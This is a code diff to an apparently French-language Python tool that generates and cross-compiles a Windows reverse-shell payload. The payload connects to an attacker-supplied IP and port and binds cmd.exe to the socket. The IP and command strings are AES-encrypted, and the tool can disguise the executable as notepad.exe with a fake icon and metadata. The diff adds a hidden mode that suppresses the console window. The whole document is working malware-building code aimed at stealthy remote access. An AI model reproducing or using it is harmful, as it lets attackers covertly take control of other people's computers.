@@ -12,9 +12,13 @@ def encrypt_bytes(text):
     encrypted = aes.encrypt(padded)
     return ', '.join(f'0x{b:02X}' for b in encrypted)
 
-def generate_payload_c(ip, cmd, port, notepad=False):
+def generate_payload_c(ip, cmd, port, notepad=False, hidden=False):
     ip_enc = encrypt_bytes(ip)
     cmd_enc = encrypt_bytes(cmd)
+
+    create_flags = "0"
+    if hidden:
+        create_flags = "CREATE_NO_WINDOW"
 
     with open("payload.c", "w") as f:
         f.write(f'''#include <winsock2.h>
@@ -87,7 +91,9 @@ int main() {{
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
-    if (!_CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    DWORD flags = {create_flags};
+
+    if (!_CreateProcessA(NULL, cmd, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi))
         return 1;
 
     return 0;
@@ -126,29 +132,28 @@ END
 ''')
         print("[+] notepad.rc généré.")
 
-def compile_payload(notepad=False, keep=False):
+def compile_payload(notepad=False, keep=False, hidden=False):
     exe_name = "notepad.exe" if notepad else "payload.exe"
 
     try:
+        cmd = [
+            "x86_64-w64-mingw32-gcc",
+            "payload.c", "aes.c"
+        ]
+
         if notepad:
             print("[*] Compilation avec icône et métadonnées...")
             subprocess.run(["x86_64-w64-mingw32-windres", "notepad.rc", "-O", "coff", "-o", "notepad.res"], check=True)
-            subprocess.run([
-                "x86_64-w64-mingw32-gcc",
-                "payload.c", "aes.c", "notepad.res",
-                "-o", exe_name,
-                "-lws2_32"
-            ], check=True)
-        else:
-            print("[*] Compilation simple...")
-            subprocess.run([
-                "x86_64-w64-mingw32-gcc",
-                "payload.c", "aes.c",
-                "-o", exe_name,
-                "-lws2_32"
-            ], check=True)
+            cmd.append("notepad.res")
 
+        cmd += ["-o", exe_name, "-lws2_32"]
+        if hidden:
+            cmd.append("-mwindows")
+
+        print(f"[*] Compilation en cours : {' '.join(cmd)}")
+        subprocess.run(cmd, check=True)
         print(f"[+] Compilation réussie : {exe_name}")
+
     finally:
         if not keep:
             for file in ["payload.c", "notepad.rc", "notepad.res"]:
@@ -165,8 +170,9 @@ if __name__ == "__main__":
     parser.add_argument("--cmd", default="cmd.exe", help="Commande à exécuter (par défaut : cmd.exe)")
     parser.add_argument("--notepad", action="store_true", help="Faux notepad avec icône et métadonnées")
     parser.add_argument("--keep", action="store_true", help="Conserver les fichiers temporaires")
+    parser.add_argument("--hidden", action="store_true", help="Masquer la console à l'exécution")
 
     args = parser.parse_args()
 
-    generate_payload_c(args.ip, args.cmd, args.port, args.notepad)
-    compile_payload(args.notepad, args.keep)
+    generate_payload_c(args.ip, args.cmd, args.port, args.notepad, args.hidden)
+    compile_payload(args.notepad, args.keep, args.hidden)
